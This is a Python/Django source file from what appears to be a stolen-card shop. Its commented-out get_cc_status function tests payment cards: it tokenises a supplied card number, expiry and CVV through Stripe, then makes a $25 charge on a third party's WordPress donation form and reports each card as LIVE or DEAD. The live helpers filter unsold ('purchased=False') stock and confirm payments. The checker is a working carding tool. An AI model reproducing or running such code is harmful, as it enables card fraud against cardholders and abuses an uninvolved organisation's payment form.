from django.core.cache import cache

# def get_cc_status(name, ccn, mm, yy, cvv, email):
#     session = requests.Session()
#     UA = 'Mozilla/5.0 (X11; Linux i686; rv:102.0) Gecko/20100101 Firefox/102.0'
#     headers = {
#             "user-agent": UA,
#             "accept": "application/json, text/plain, */*",
#             "content-type": "application/x-www-form-urlencoded"
#         }
#     s = session.post('https://m.stripe.com/6', headers=headers)
#     r = s.json()
#     Guid = r['guid']
#     Muid = r['muid']
#     Sid = r['sid']
#     postdata = {
#                 "guid": Guid,
#                 "muid": Muid,
#                 "sid": Sid,
#                 "key": "pk_live_YJm7rSUaS7t9C8cdWfQeQ8Nb",
#                 "card[name]": name,
#                 "card[number]": ccn,
#                 "card[exp_month]": mm,
#                 "card[exp_year]": yy,
#                 "card[cvc]": cvv
#             }

#     HEADER = {
#                 "accept": "application/json",
#                 "content-type": "application/x-www-form-urlencoded",
#                 "user-agent": UA,
#                 "origin": "https://js.stripe.com",
#                 "referrer": "https://js.stripe.com/",
#                 "accept-language": "en-US,en;q=0.9"
#             }

#     pr = session.post('https://api.stripe.com/v1/tokens',
#                         data=postdata, headers=HEADER)
#     Id = pr.json()['id']

#             # hmm
#     load = {
#         "action": "wp_full_stripe_payment_charge",
#         "formName": "BanquetPayment",
#         "fullstripe_name": name,
#         "fullstripe_email": email,
#         "fullstripe_custom_amount": "25.0",
#         "fullstripe_amount_index": 0,
#         "stripeToken": Id
#     }

#     header = {
#         "accept": "application/json, text/javascript, */*; q=0.01",
#         "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
#         "user-agent": UA,
#         "origin": "https://archiro.org",
#         "referer": "https://archiro.org/banquet/",
#         "accept-language": "en-US,en;q=0.9"
#     }

#     rx = session.post('https://archiro.org/wp-admin/admin-ajax.php',
#                         data=load, headers=header)
#     msg = rx.json()['msg']

#     if 'true' in rx.text:
#         return "LIVE"
#     elif 'security code' in rx.text:
#         return "LIVE"
    
#     return "DEAD"

def confirm_payment(response):
    return response["data"]["payments"][0]["status"] if len(response["data"]["payments"]) > 0 else "PENDING"

def filter_objects(request, model, attrs, name):
    filters = {}
    for var, value in request.GET.items():
        if var not in attrs:
            continue
        filters[var] = value
    
    cache_key = f"{name}_filters"
    if cache.get(cache_key):
        unique = cache.get(cache_key)
    else:
        unique = {}
        for attr in attrs:
            unique[attr] = model.objects.filter(purchased=False).values_list(attr, flat=True).distinct(attr)
        cache.set(cache_key, unique, 60*60*24)
    return unique, filters